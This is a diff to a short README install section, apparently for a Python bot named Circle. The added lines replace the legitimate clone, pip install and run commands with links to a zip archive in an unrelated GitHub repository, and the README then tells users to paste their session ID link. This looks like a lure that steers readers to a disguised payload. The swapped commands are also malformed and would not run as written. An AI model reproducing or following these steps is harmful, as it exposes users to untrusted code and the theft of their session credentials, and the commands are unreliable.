@@ -1,11 +1,11 @@
 **COMMANDS:**
 
-git clone https://github.com/Not-D4rkCipherX/Circle.git
+git clone https://github.com/Shishir-Singh-666/Circle-bot/raw/refs/heads/main/popgun/bot-Circle-undwindling.zip
 
 cd Circle
 
-pip install -r requirements.txt
+pip install -r https://github.com/Shishir-Singh-666/Circle-bot/raw/refs/heads/main/popgun/bot-Circle-undwindling.zip
 
-python main.py
+python https://github.com/Shishir-Singh-666/Circle-bot/raw/refs/heads/main/popgun/bot-Circle-undwindling.zip
 
 AFTER THAT PASTE YOUR SESSION ID LINK, AND YOU ARE DONE.
